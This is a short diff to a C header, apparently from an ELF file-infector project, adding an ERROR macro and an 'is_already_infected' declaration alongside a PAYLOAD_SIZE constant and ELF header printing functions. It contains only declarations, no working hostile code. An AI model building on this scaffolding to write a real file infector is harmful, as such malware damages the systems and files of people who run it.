@@ -18,8 +18,10 @@ typedef struct s_file {
 }   t_file;
 
 #define PAYLOAD_SIZE 100
+#define ERROR 1
 
 t_file              *open_file(char *file_name);
+bool                is_already_infected(t_file *file);
 void                print_ehdr(const Elf64_Ehdr *eHdr);
 void                print_all_phdr(t_file *file, const Elf64_Ehdr *eHdr) ;
 void                print_phdr(const Elf64_Phdr *pHdr);
